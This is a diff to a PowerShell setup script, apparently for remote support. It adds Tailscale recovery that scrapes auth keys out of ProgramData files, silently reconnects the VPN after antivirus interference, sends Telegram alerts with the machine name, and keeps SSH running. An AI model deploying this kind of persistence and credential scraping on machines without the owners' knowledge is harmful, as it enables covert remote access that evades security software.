@@ -16,6 +16,51 @@ if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
   }
 }
 
+# 0c) Tailscale RECOVERY: if installed but logged out / blocked (e.g. antivirus
+#     interrupted it), log back in automatically. The key is read from where the
+#     setup already saved it on THIS machine - never stored in this public file.
+$tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
+if($tsExe){
+  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
+  $st = (& $tsExe status 2>&1 | Out-String)
+  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
+    $key=''
+    foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
+      if(-not $key -and (Test-Path $d)){
+        foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
+          $c = Get-Content $f.FullName -Raw -EA 0
+          $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
+          if($m.Success){ $key=$m.Value; break }
+        }
+      }
+    }
+    if($key){
+      Start-Service Tailscale -EA 0
+      & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
+      $tg = Join-Path $dir 'tg.txt'
+      if(Test-Path $tg){
+        $tk='';$tc=''
+        foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
+        if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale was down on "+$env:COMPUTERNAME+" (antivirus/logout) - auto-reconnected.")} | Out-Null }catch{} }
+      }
+    }
+  }
+}
+else{
+  # Tailscale .exe is gone - antivirus likely deleted it. Alert once (needs manual allow).
+  $mk = Join-Path $dir 'ts-missing.flag'
+  if(-not (Test-Path $mk)){
+    $tg = Join-Path $dir 'tg.txt'
+    if(Test-Path $tg){
+      $tk='';$tc=''
+      foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
+      if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale MISSING on "+$env:COMPUTERNAME+" - antivirus may have removed it. Allow Tailscale in the antivirus, then re-run setup.")} | Out-Null }catch{} }
+    }
+    Set-Content $mk '1' -Encoding ascii
+  }
+}
+
+
 # 1) SSH stays up + key config
 Start-Service sshd
 Set-Service -Name sshd -StartupType Automatic
